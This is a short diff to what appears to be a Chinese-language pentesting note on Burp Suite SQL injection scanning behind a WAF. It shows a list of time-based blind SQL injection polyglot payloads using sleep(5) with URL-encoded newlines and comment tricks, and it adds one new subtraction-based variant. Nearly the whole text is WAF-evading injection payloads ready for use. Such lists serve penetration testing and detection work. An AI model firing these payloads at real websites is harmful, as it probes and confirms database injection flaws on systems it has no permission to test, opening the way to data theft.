@@ -8,3 +8,4 @@ Burp自带的SQLi扫描，发送的burp感觉有点多，在有waf的情况下�
 payload
 `11%0axor(sleep(5))%23'xor(sleep(5))%23"xor(sleep(5))%23'`
 `5%0axor%0asleep(5)/*'xor%0asleep(5)xor%0a'"xor%0asleep(5)xor%0a"*/`
+`5%0a-%0asleep(5)/*'-%0asleep(5)-%0a'"-%0asleep(5)-%0a"*/`
